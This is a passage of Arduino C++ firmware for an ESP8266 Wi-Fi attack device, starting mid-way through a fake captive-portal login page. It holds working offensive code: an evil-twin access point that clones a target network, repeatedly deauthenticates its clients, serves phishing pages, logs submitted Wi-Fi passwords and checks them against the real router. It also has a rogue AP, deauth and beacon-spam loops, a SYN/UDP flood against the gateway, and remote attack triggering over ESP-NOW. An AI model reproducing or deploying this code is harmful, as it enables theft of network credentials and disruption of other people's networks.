<body><div class='b'><h3>Internet Access Portal</h3>
<p>Enter password to connect to the internet.</p>
<form method='POST' action='/'><input name='password' type='password' placeholder='Password' required>
<button type='submit'>Connect Now</button></form></div></body></html>)=====";

// Template pointer arrays
const char* const etwinTemplates[] = {
  ETWIN_DEFAULT_HTML, ETWIN_1_HTML, ETWIN_2_HTML,
  ETWIN_3_HTML, ETWIN_4_HTML, ETWIN_5_HTML
};
const char* const rogueTemplates[] = {
  ROGUE_DEFAULT_HTML, ROGUE_1_HTML, ROGUE_2_HTML,
  ROGUE_3_HTML, ROGUE_4_HTML, ROGUE_5_HTML
};

// ============================================================
// Captive Portal — DNS + Web Server
// ============================================================

// Get HTML template for current attack mode
String getPortalHTML() {
  const char* html;
  uint8_t idx = currentPortalTemplate;
  if (evilTwinActive) {
    if (idx > 5) idx = 0;
    html = etwinTemplates[idx];
  } else {
    if (idx > 5) idx = 0;
    html = rogueTemplates[idx];
  }
  return String((const __FlashStringHelper*)html);
}

// Serve the portal login page
void handlePortalRoot() {
  server.send(200, "text/html", getPortalHTML());
}

// Handle captive portal detection probes (302 redirect)
void handleCaptiveProbe() {
  server.sendHeader("Location", String("http://") +
                    WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/plain", "");
}

// Handle password form submission
void handlePortalPassword() {
  if (!server.hasArg("password")) {
    server.send(400, "text/plain", "Missing password");
    return;
  }
  String pwd = server.arg("password");
  capturePassword(pwd);

  // Store captured credential
  strncpy(capturedCred.password, pwd.c_str(), 64);
  capturedCred.password[64] = '\0';
  capturedCred.captured = true;

  // Evil twin: verify password against real AP
  if (evilTwinActive && strlen(cfg.target_ssid) > 0) {
    Serial.printf("[VERIFY] Testing password against real AP: %s\n", cfg.target_ssid);
    WiFi.mode(WIFI_AP_STA);
    WiFi.begin(cfg.target_ssid, pwd.c_str(), cfg.target_ch, cfg.target_bssid);
    uint32_t startWait = millis();
    bool connected = false;
    while (millis() - startWait < 10000) {
      if (WiFi.status() == WL_CONNECTED) { connected = true; break; }
      delay(500);
    }
    capturedCred.verified = connected;
    if (connected) {
      Serial.println(F("[VERIFY] Password VERIFIED!"));
      WiFi.disconnect();
    } else {
      Serial.println(F("[VERIFY] Password INCORRECT."));
    }
    WiFi.mode(WIFI_AP);
  }

  // Show "connecting" page
  String html = F("<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Connecting...</title><style>"
    "body{font-family:Arial;text-align:center;margin-top:50px;background:#1a1a2e;color:#eee}"
    "</style></head><body><h2>Connecting...</h2>"
    "<p>Please wait while we verify your connection.</p></body></html>");
  server.send(200, "text/html", html);
}

// Redirect all unknown requests to portal
void handlePortalRedirect() {
  server.sendHeader("Location", String("http://") +
                    WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/plain", "");
}

// Set up captive portal: DNS + web server routes
void setupCaptivePortal() {
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  dnsServerActive = true;

  server.on("/", HTTP_GET, handlePortalRoot);
  server.on("/", HTTP_POST, handlePortalPassword);
  // OS captive portal detection endpoints
  server.on("/generate_204", HTTP_GET, handleCaptiveProbe);
  server.on("/gen_204", HTTP_GET, handleCaptiveProbe);
  server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveProbe);
  server.on("/library/test/success.html", HTTP_GET, handleCaptiveProbe);
  server.on("/connecttest.txt", HTTP_GET, handleCaptiveProbe);
  server.on("/ncsi.txt", HTTP_GET, handleCaptiveProbe);
  server.onNotFound(handlePortalRedirect);
  server.begin();
  Serial.println(F("[PORTAL] Captive portal started"));
}

// Process captive portal requests — call from loop
void processCaptivePortal() {
  if (dnsServerActive) dnsServer.processNextRequest();
  server.handleClient();
}

// ============================================================
// 6. Evil Twin — startEvilTwin()
// Clone target AP SSID, start softAP, DNS captive portal,
// deauth target clients, serve portal, capture passwords.
// Supports 5 template pages (etwin1-5) plus default.
// Verifies captured password by connecting to real AP.
// ============================================================

void startEvilTwin() {
  if (strlen(cfg.target_ssid) == 0) {
    Serial.println(F("[ETWIN] No target selected"));
    return;
  }
  memset(&capturedCred, 0, sizeof(capturedCred));
  strncpy(capturedCred.ssid, cfg.target_ssid, 32);
  currentPortalTemplate = (uint8_t)cfg.Etwin_Path;

  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  // Clone SSID on same or nearby channel
  uint8_t etwinCh = cfg.target_ch > 0 ? cfg.target_ch : 6;
  if (etwinCh > 11) etwinCh = 1;
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1),
                    IPAddress(255,255,255,0));
  WiFi.softAP(cfg.target_ssid, NULL, etwinCh, false, 4);

  evilTwinActive = true;
  passwordsCaptured = 0;
  cfg.Attack_Mode = ATTACK_EVIL_TWIN;
  Serial.printf("[ETWIN] Evil-Twin started on %s CH:%u\n",
                cfg.target_ssid, etwinCh);
  Serial.print(F("[ETWIN] AP IP: "));
  Serial.println(WiFi.softAPIP());

  setupCaptivePortal();
  updateOLEDStatus("EVIL TWIN ON");
  updateOLED(0, "Evil Twin Active");
  updateOLED(1, cfg.target_ssid);
}

void stopEvilTwin() {
  evilTwinActive = false;
  if (cfg.Attack_Mode == ATTACK_EVIL_TWIN) cfg.Attack_Mode = ATTACK_NONE;
  if (dnsServerActive) { dnsServer.stop(); dnsServerActive = false; }
  server.onNotFound([]() { server.send(404, "text/plain", "Not Found"); });
  WiFi.softAPdisconnect(true);
  // Restore original AP
  WiFi.mode(WIFI_AP);
  WiFi.softAP(cfg.AP_SSID, cfg.AP_Password);
  Serial.println(F("[ETWIN] Evil twin stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// 7. Rogue AP — startRogueAP()
// Standalone fake AP with captive portal, capture credentials.
// Supports 5 template pages (rogue1-5) plus default.
// ============================================================

void startRogueAP() {
  memset(&capturedCred, 0, sizeof(capturedCred));
  currentPortalTemplate = (uint8_t)cfg.Rogue_Path;

  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  const char* rogueSSID = (strlen(cfg.roguehotspotname) > 0)
                          ? cfg.roguehotspotname : cfg.Rogue_SSID;
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1),
                    IPAddress(255,255,255,0));
  WiFi.softAP(rogueSSID);

  rogueAPActive = true;
  passwordsCaptured = 0;
  cfg.Attack_Mode = ATTACK_ROGUE_AP;
  Serial.printf("[ROGUE] Rogue AP started: %s\n", rogueSSID);
  Serial.print(F("[ROGUE] AP IP: "));
  Serial.println(WiFi.softAPIP());

  setupCaptivePortal();
  updateOLEDStatus("ROGUE AP ON");
  updateOLED(0, "Rogue AP Active");
  updateOLED(1, rogueSSID);
}

void stopRogueAP() {
  rogueAPActive = false;
  if (cfg.Attack_Mode == ATTACK_ROGUE_AP) cfg.Attack_Mode = ATTACK_NONE;
  if (dnsServerActive) { dnsServer.stop(); dnsServerActive = false; }
  server.onNotFound([]() { server.send(404, "text/plain", "Not Found"); });
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(cfg.AP_SSID, cfg.AP_Password);
  Serial.println(F("[ROGUE] Rogue AP stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// 8. Router Guard — startRouterGuard()
// Connect to target AP, monitor connected stations,
// deauth unauthorized stations based on whitelist/blacklist.
// ============================================================

// Check if MAC is authorized based on guard behavior
bool isMacAuthorized(const uint8_t* mac) {
  bool inList = false;
  for (int i = 0; i < MAX_MAC_LIST; i++) {
    if (strlen(cfg.mac_list[i]) > 0) {
      uint8_t listMac[6];
      if (parseMAC(String(cfg.mac_list[i]), listMac) &&
          memcmp(listMac, mac, 6) == 0) {
        inList = true;
        break;
      }
    }
  }
  if (cfg.guard_behavior == GUARD_WHITELIST) return inList;   // only allow listed
  else if (cfg.guard_behavior == GUARD_BLACKLIST) return !inList; // block listed
  return true; // GUARD_OFF: allow all
}

// Promiscuous callback for Router Guard
static void ICACHE_FLASH_ATTR routerGuardCallback(uint8_t *buf, uint16_t len) {
  if (!routerGuardActive) return;
  if (len <= WIFI_RX_CTRL_SIZE) return;
  struct wifi_promiscuous_pkt_t* pkt = (struct wifi_promiscuous_pkt_t*)buf;
  uint8_t* frame = pkt->payload;
  int frameLen = len - WIFI_RX_CTRL_SIZE;
  if (frameLen < 24) return;

  uint8_t ftype = (frame[0] >> 2) & 0x03;
  if (ftype != WLAN_FRAME_TYPE_MGMT && ftype != WLAN_FRAME_TYPE_DATA) return;

  struct wifi_mac_hdr_t* mac = (struct wifi_mac_hdr_t*)frame;
  // Check if frame involves our target AP
  bool involvesTarget = (memcmp(mac->addr1, cfg.target_bssid, 6) == 0 ||
                         memcmp(mac->addr2, cfg.target_bssid, 6) == 0 ||
                         memcmp(mac->addr3, cfg.target_bssid, 6) == 0);
  if (!involvesTarget) return;

  // Extract station MAC (not AP, not broadcast)
  uint8_t* sta = NULL;
  if (memcmp(mac->addr1, cfg.target_bssid, 6) != 0 &&
      !isBroadcastMac(mac->addr1) && !isNullMac(mac->addr1))
    sta = mac->addr1;
  else if (memcmp(mac->addr2, cfg.target_bssid, 6) != 0 &&
           !isBroadcastMac(mac->addr2) && !isNullMac(mac->addr2))
    sta = mac->addr2;
  if (!sta) return;

  // Deauth unauthorized stations
  if (!isMacAuthorized(sta)) {
    sendDeauthBurst(cfg.target_bssid, sta);
    Serial.printf("[GUARD] Deauthed unauthorized: ");
    printMac(sta);
    Serial.println();
  }
}

void startRouterGuard() {
  if (cfg.target_ch == 0) {
    Serial.println(F("[GUARD] No target selected"));
    return;
  }
  routerGuardActive = true;
  guardStationCount = 0;
  cfg.Attack_Mode = ATTACK_ROUTER_GUARD;

  // Connect to target AP
  WiFi.mode(WIFI_STA);
  WiFi.begin(cfg.target_ssid, NULL, cfg.target_ch, cfg.target_bssid);
  Serial.printf("[GUARD] Connecting to %s CH:%u\n", cfg.target_ssid, cfg.target_ch);
  uint32_t startWait = millis();
  while (WiFi.status() != WL_CONNECTED && millis() - startWait < 15000) {
    delay(500); Serial.print(".");
  }
  if (WiFi.status() == WL_CONNECTED) {
    Serial.printf("\n[GUARD] Connected! IP: %s\n", WiFi.localIP().toString().c_str());
  } else {
    Serial.println(F("\n[GUARD] Failed to connect, monitor-only mode"));
  }

  // Enable promiscuous mode to monitor stations
  wifi_set_channel(cfg.target_ch);
  wifi_set_promiscuous_rx_cb(routerGuardCallback);
  wifi_set_promiscuous(true);

  Serial.printf("[GUARD] Mode: %s, MACs: %d\n",
    cfg.guard_behavior == GUARD_WHITELIST ? "WHITELIST" :
    cfg.guard_behavior == GUARD_BLACKLIST ? "BLACKLIST" : "OFF", MAX_MAC_LIST);
  updateOLEDStatus("ROUTER GUARD");
}

void stopRouterGuard() {
  routerGuardActive = false;
  if (cfg.Attack_Mode == ATTACK_ROUTER_GUARD) cfg.Attack_Mode = ATTACK_NONE;
  wifi_set_promiscuous(false);
  wifi_set_promiscuous_rx_cb(NULL);
  WiFi.disconnect();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(cfg.AP_SSID, cfg.AP_Password);
  Serial.println(F("[GUARD] Router guard stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// 9. DDoS Router — ddosRouter()
// Flood target router with TCP SYN, UDP, and ICMP packets.
// ============================================================

void startDDoSRouter() {
  if (cfg.target_ch == 0) {
    Serial.println(F("[DDOS] No target selected"));
    return;
  }
  // Connect to target AP if not already connected
  if (WiFi.status() != WL_CONNECTED) {
    WiFi.mode(WIFI_STA);
    WiFi.begin(cfg.target_ssid);
    uint32_t startWait = millis();
    while (WiFi.status() != WL_CONNECTED && millis() - startWait < 10000)
      delay(500);
  }
  ddosActive = true;
  ddosPacketCount = 0;
  cfg.Attack_Mode = ATTACK_DDOS_ROUTER;
  Serial.println(F("[ATTACK] DDoS router started"));
  updateOLEDStatus("DDOS ROUTER");
}

void stopDDoSRouter() {
  ddosActive = false;
  if (cfg.Attack_Mode == ATTACK_DDOS_ROUTER) cfg.Attack_Mode = ATTACK_NONE;
  ddosClient.stop();
  Serial.println(F("[ATTACK] DDoS stopped"));
  updateOLEDStatus("IDLE");
}

// Run DDoS: TCP SYN flood + UDP flood
void runDDoS() {
  if (WiFi.status() != WL_CONNECTED) return;
  IPAddress gateway = WiFi.gatewayIP();
  if (gateway[0] == 0) return;

  // TCP SYN flood: rapid connection attempts
  for (int i = 0; i < 5; i++) {
    WiFiClient c;
    c.connect(gateway, 80 + random(0, 100));
    c.stop();
    ddosPacketCount++;
  }

  // UDP flood
  WiFiUDP udp;
  uint8_t payload[256];
  for (int i = 0; i < sizeof(payload); i++) payload[i] = random(256);
  for (int i = 0; i < 10; i++) {
    udp.beginPacket(gateway, random(1, 65535));
    udp.write(payload, sizeof(payload));
    udp.endPacket();
    ddosPacketCount++;
  }

  // ICMP: ESP8266 Arduino lacks a direct ICMP API.
  // Raw deauth burst adds to router load as ICMP substitute.
  if (cfg.target_bssid[0] != 0) {
    sendDeauthBurst(cfg.target_bssid);
  }
}

// ============================================================
// 10. Deauth Monitor — startDeauthMonitor()
// Use promiscuous mode to detect incoming deauth frames, log them.
// ============================================================

// Promiscuous callback for deauth monitoring and sniffing
static void ICACHE_FLASH_ATTR attackSnifferCb(uint8_t *buf, uint16_t len) {
  if (!snifferActive && !deauthMonitorActive) return;
  if (len <= WIFI_RX_CTRL_SIZE) return;
  struct wifi_promiscuous_pkt_t* pkt = (struct wifi_promiscuous_pkt_t*)buf;
  uint8_t* frame = pkt->payload;
  int frameLen = len - WIFI_RX_CTRL_SIZE;
  if (frameLen < 2) return;

  sniffPktCount++;
  uint8_t ftype = (frame[0] >> 2) & 0x03;
  uint8_t fsub = (frame[0] >> 4) & 0x0F;
  if (ftype != WLAN_FRAME_TYPE_MGMT) return;

  if (fsub == WLAN_SUBTYPE_PROBE_REQ) sniffProbeCount++;
  if (fsub == WLAN_SUBTYPE_BEACON) sniffBeaconCount++;

  if (fsub == WLAN_SUBTYPE_DEAUTH || fsub == WLAN_SUBTYPE_DISASSOC) {
    deauthDetected++;
    int8_t rssi = (int8_t)pkt->rx_ctrl[0];
    if (frameLen >= 24) {
      struct wifi_mac_hdr_t* mac = (struct wifi_mac_hdr_t*)frame;
      struct nc_deauth_log* entry = &deauthLog[deauthLogIndex % MAX_DEAUTH_LOG];
      memcpy(entry->src, mac->addr2, 6);
      memcpy(entry->dst, mac->addr1, 6);
      memcpy(entry->bssid, mac->addr3, 6);
      entry->channel = wifi_get_channel();
      entry->rssi = rssi;
      entry->timestamp = millis();
      deauthLogIndex++;
      Serial.printf("[DEAUTH_MON] SRC:");
      printMac(mac->addr2);
      Serial.printf(" DST:");
      printMac(mac->addr1);
      Serial.printf(" RSSI:%d CH:%d\n", rssi, entry->channel);
    }
  }
}

void startDeauthMonitor() {
  deauthMonitorActive = true;
  snifferActive = false;
  deauthDetected = 0;
  deauthLogIndex = 0;
  memset(deauthLog, 0, sizeof(deauthLog));
  cfg.Attack_Mode = ATTACK_DEAUTH_MONITOR;

  WiFi.disconnect();
  wifi_set_opmode_current(STATION_MODE);
  wifi_set_promiscuous_rx_cb(attackSnifferCb);
  wifi_set_promiscuous(true);
  trueDeauthChannel = 1;
  wifi_set_channel(1);
  Serial.println(F("[DEAUTH_MON] Monitor started, channel hopping"));
  updateOLEDStatus("DEAUTH MONITOR");
  updateOLED(0, "Deauth Monitor");
}

// ============================================================
// 11. Sniffer — startSniffer(mode)
// Promiscuous mode packet capture.
// Mode: SNIFF_PROBE (probe requests), SNIFF_ALL (all packets),
//       SNIFF_DEAUTH (deauth detection), SNIFF_STATION (station observation)
// ============================================================

void startSniffer(SnifferMode mode) {
  snifferActive = true;
  deauthMonitorActive = (mode == SNIFF_DEAUTH);
  sniffPktCount = 0;
  sniffProbeCount = 0;
  sniffBeaconCount = 0;
  deauthDetected = 0;

  WiFi.disconnect();
  wifi_set_opmode_current(STATION_MODE);
  wifi_set_promiscuous_rx_cb(attackSnifferCb);
  wifi_set_promiscuous(true);

  if (cfg.target_ch > 0) {
    wifi_set_channel(cfg.target_ch);
    trueDeauthChannel = cfg.target_ch;
  } else {
    wifi_set_channel(1);
    trueDeauthChannel = 1;
  }

  const char* modeStr = "ALL";
  if (mode == SNIFF_PROBE) modeStr = "PROBE";
  else if (mode == SNIFF_DEAUTH) modeStr = "DEAUTHMON";
  else if (mode == SNIFF_STATION) modeStr = "STATION";

  Serial.printf("[SNIFFER] Mode %s on CH:%d\n", modeStr, trueDeauthChannel);
  updateOLEDStatus("SNIFFER");
  updateOLED(0, modeStr);
}

void stopSniffer() {
  snifferActive = false;
  deauthMonitorActive = false;
  wifi_set_promiscuous(false);
  wifi_set_promiscuous_rx_cb(NULL);
  Serial.println(F("[SNIFFER] Stopped"));
  updateOLEDStatus("IDLE");
}

// ============================================================
// 12. Stop Functions
// ============================================================

// Stop ALL attacks and restore normal state
void stopAllAttacks() {
  deauthActive        = false;
  deauthAllActive     = false;
  preciseDeauthActive = false;
  trueDeauthActive    = false;
  evilTwinActive      = false;
  rogueAPActive       = false;
  beaconSpamActive    = false;
  ddosActive          = false;
  routerGuardActive   = false;
  snifferActive       = false;
  deauthMonitorActive = false;
  ddosClient.stop();

  // Disable promiscuous mode
  wifi_set_promiscuous(false);
  wifi_set_promiscuous_rx_cb(NULL);

  // Stop DNS server
  if (dnsServerActive) { dnsServer.stop(); dnsServerActive = false; }

  // Reset web server routes
  server.onNotFound([]() { server.send(404, "text/plain", "Not Found"); });

  // Restore AP mode
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(cfg.AP_SSID, cfg.AP_Password);

  cfg.Attack_Mode = ATTACK_NONE;
  Serial.println(F("[ATTACK] All attacks stopped"));
  updateOLEDStatus("IDLE");
  updateOLED(0, "Ready");
}

// ============================================================
// Capture a submitted password (from captive portal)
// Called by handlePortalPassword and webserver.h capturePassword()
// ============================================================

void capturePassword(const String& password) {
  passwordsCaptured++;
  // Log to /log.txt
  String logEntry = "[PASS] SSID:" + String(cfg.target_ssid) +
                    " Pass:" + password + "\n";
  File f = LittleFS.open("/log.txt", "a");
  if (f) { f.print(logEntry); f.close(); }
  Serial.printf("[CAPTURE] Password #%d: %s\n", passwordsCaptured, password.c_str());
}

// ============================================================
// 13. ESP-NOW Remote Control — ESPNOW_QC Command Processing
// Process commands: target_sync, deauth_on, deauth_off,
// deauthall_on, deauthall_off, rogueap_start,
// softap_hide, softap_show, reboot
// ============================================================

String processESPNOWCommand(const String& cmd) {
  String response = "OK";
  if (cmd == "target_sync") {
    Serial.println(F("[ESPNOW_QC] target_sync"));
    response = "TARGET SYNCED";
  }
  else if (cmd == "deauth_on") {
    startDeauthAttack();
    response = "DEAUTH ON";
  }
  else if (cmd == "deauth_off") {
    stopDeauthAttack();
    response = "DEAUTH OFF";
  }
  else if (cmd == "deauthall_on") {
    startDeauthAllAttack();
    response = "DEAUTHALL ON";
  }
  else if (cmd == "deauthall_off") {
    stopDeauthAllAttack();
    response = "DEAUTHALL OFF";
  }
  else if (cmd == "rogueap_start") {
    startRogueAP();
    response = "ROGUEAP START";
  }
  else if (cmd == "softap_hide") {
    hideSoftAP();
    response = "AP HIDDEN";
  }
  else if (cmd == "softap_show") {
    showSoftAP();
    response = "AP VISIBLE";
  }
  else if (cmd == "reboot") {
    Serial.println(F("[ESPNOW_QC] reboot"));
    response = "REBOOTING";
    delay(500);
    ESP.restart();
  }
  else {
    response = "UNKNOWN COMMAND";
  }
  Serial.printf("[ESPNOW_QC] %s => %s\n", cmd.c_str(), response.c_str());
  return response;
}

// ============================================================
// 14. BW16 5GHz Module Support (Stubs)
// BW16 (RTL8720DN) provides 5GHz deauth via serial commands.
// ============================================================

bool initBW16() {
  Serial1.begin(115200);
  delay(1000);
  Serial1.println("BW16_INIT");
  delay(500);
  if (Serial1.available()) {
    String resp = Serial1.readString();
    if (resp.indexOf("OK") >= 0) {
      bw16Enabled = true;
      Serial.println(F("[BW16] Module initialized"));
      return true;
    }
  }
  Serial.println(F("[BW16] Init failed"));
  return false;
}

// Send 5GHz deauth command to BW16 module
void BW16_deauth_on(const uint8_t* bssid, uint8_t channel) {
  if (!bw16Enabled) {
    Serial.println(F("[BW16] Module not initialized"));
    return;
  }
  String cmd = "BW16_DEAUTH_ON:";
  for (int i = 0; i < 6; i++) {
    if (i > 0) cmd += ":";
    if (bssid[i] < 0x10) cmd += "0";
    cmd += String(bssid[i], HEX);
  }
  cmd += ":" + String(channel);
  Serial1.println(cmd);
  Serial.printf("[BW16] Sent: %s\n", cmd.c_str());
}

// Stop 5GHz deauth on BW16 module
void BW16_deauth_off() {
  if (!bw16Enabled) return;
  Serial1.println("BW16_DEAUTH_OFF");
  Serial.println(F("[BW16] 5GHz deauth stopped"));
}

// ============================================================
// Utility — get status JSON for webserver
// ============================================================

String getAttackStatusJSON() {
  String json = "{";
  json += "\"mode\":" + String(cfg.Attack_Mode) + ",";
  json += "\"deauth\":" + String(deauthActive ? "true" : "false") + ",";
  json += "\"deauth_all\":" + String(deauthAllActive ? "true" : "false") + ",";
  json += "\"evil_twin\":" + String(evilTwinActive ? "true" : "false") + ",";
  json += "\"rogue_ap\":" + String(rogueAPActive ? "true" : "false") + ",";
  json += "\"beacon_spam\":" + String(beaconSpamActive ? "true" : "false") + ",";
  json += "\"ddos\":" + String(ddosActive ? "true" : "false") + ",";
  json += "\"router_guard\":" + String(routerGuardActive ? "true" : "false") + ",";
  json += "\"sniffer\":" + String(snifferActive ? "true" : "false") + ",";
  json += "\"deauth_pkts\":" + String(deauthPacketCount) + ",";
  json += "\"beacon_pkts\":" + String(beaconSpamCount) + ",";
  json += "\"ddos_pkts\":" + String(ddosPacketCount) + ",";
  json += "\"sniff_pkts\":" + String(sniffPktCount) + ",";
  json += "\"deauth_detected\":" + String(deauthDetected) + ",";
  json += "\"passwords\":" + String(passwordsCaptured) + ",";
  json += "\"scan_count\":" + String(scanResultCount);
  json += "}";
  return json;
}

// Get deauth detection log as text
String getDeauthLogText() {
  String text = "";
  int count = (deauthLogIndex < MAX_DEAUTH_LOG) ? deauthLogIndex : MAX_DEAUTH_LOG;
  for (int i = 0; i < count; i++) {
    struct nc_deauth_log* e = &deauthLog[i];
    text += "[Deauth] SRC:";
    for (int j = 0; j < 6; j++) {
      if (j > 0) text += ":";
      if (e->src[j] < 0x10) text += "0";
      text += String(e->src[j], HEX);
    }
    text += " DST:";
    for (int j = 0; j < 6; j++) {
      if (j > 0) text += ":";
      if (e->dst[j] < 0x10) text += "0";
      text += String(e->dst[j], HEX);
    }
    text += " CH:" + String(e->channel) + " RSSI:" + String(e->rssi) + "\n";
  }
  return text;
}

// ============================================================
// handleAttacks() — called from main loop() on each iteration.
// Drives all active attacks at appropriate intervals.
// ============================================================

void handleAttacks() {
  uint32_t now = millis();

  // --- Deauth (targeted) ---
  if (deauthActive && now - lastAttackTick >= cfg.deauthDelay) {
    lastAttackTick = now;
    if (cfg.target_bssid[0] != 0) {
      sendDeauthBurst(cfg.target_bssid);
    }
  }

  // --- Deauth All ---
  if (deauthAllActive && now - lastAttackTick >= cfg.deauthDelay) {
    lastAttackTick = now;
    sendDeauthAll();
  }

  // --- Precise Deauth ---
  if (preciseDeauthActive && now - lastAttackTick >= cfg.deauthDelay) {
    lastAttackTick = now;
    sendPreciseDeauth();
  }

  // --- True Deauth (channel-hopping) ---
  if (trueDeauthActive) {
    runTrueDeauth();
    if (now - lastAttackTick >= cfg.deauthDelay) {
      lastAttackTick = now;
    }
  }

  // --- Beacon Spam ---
  if (beaconSpamActive) {
    // Parse SSID list (pipe or newline separated), cycle through
    char delim = beaconSSIDList.indexOf('|') >= 0 ? '|' : '\n';
    String ssid;
    int pos = 0, count = 0;
    int listLen = beaconSSIDList.length();
    while (pos < listLen && count <= beaconCurrentIndex) {
      ssid = "";
      while (pos < listLen && beaconSSIDList[pos] != delim)
        ssid += beaconSSIDList[pos++];
      pos++;
      count++;
    }
    if (ssid.length() == 0) {
      beaconCurrentIndex = 0;
      pos = 0;
      while (pos < listLen && beaconSSIDList[pos] != delim)
        ssid += beaconSSIDList[pos++];
    }
    ssid.trim();
    if (ssid.length() > 0) sendBeacon(ssid.c_str());
    beaconCurrentIndex++;
    if (beaconCurrentIndex > 20) beaconCurrentIndex = 0;
  }

  // --- Evil Twin: process captive portal + deauth real AP clients ---
  if (evilTwinActive) {
    processCaptivePortal();
    // Periodically deauth clients from the real AP
    static uint32_t lastEtwinDeauth = 0;
    if (now - lastEtwinDeauth > 2000) {
      uint8_t savedOp = wifi_get_opmode();
      wifi_set_opmode_current(STATION_MODE);
      wifi_set_channel(cfg.target_ch);
      delay(1);
      if (cfg.target_bssid[0] != 0) sendDeauthBurst(cfg.target_bssid);
      wifi_set_opmode_current(savedOp);
      lastEtwinDeauth = now;
    }
  }

  // --- Rogue AP: process captive portal ---
  if (rogueAPActive) {
    processCaptivePortal();
  }

  // --- Router Guard: connection keepalive ---
  if (routerGuardActive) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println(F("[GUARD] Reconnecting..."));
      WiFi.begin(cfg.target_ssid, NULL, cfg.target_ch, cfg.target_bssid);
      delay(1000);
    }
  }

  // --- DDoS Router ---
  if (ddosActive) {
    if (now - lastDdosPacket > 5) {
      lastDdosPacket = now;
      runDDoS();
    }
  }

  // --- Deauth Monitor: channel hop + display update ---
  if (deauthMonitorActive) {
    hopChannelsInterval(CHANNEL_HOP_INTERVAL_MS);
    static uint32_t lastMonDisplay = 0;
    if (now - lastMonDisplay > 1000) {
      char buf[32];
      snprintf(buf, sizeof(buf), "Det:%lu Pkts:%lu",
               (unsigned long)deauthDetected, (unsigned long)sniffPktCount);
      updateOLED(1, buf);
      lastMonDisplay = now;
    }
  }

  // --- Sniffer: channel hop (except probe mode) + display update ---
  if (snifferActive && !deauthMonitorActive) {
    hopChannelsInterval(CHANNEL_HOP_INTERVAL_MS);
    static uint32_t lastSniffDisplay = 0;
    if (now - lastSniffDisplay > 1000) {
      char buf[32];
      snprintf(buf, sizeof(buf), "P:%lu D:%lu B:%lu",
               (unsigned long)sniffPktCount,
               (unsigned long)sniffProbeCount,
               (unsigned long)sniffBeaconCount);
      updateOLED(1, buf);
      lastSniffDisplay = now;
    }
  }
}

#endif // ATTACKS_H
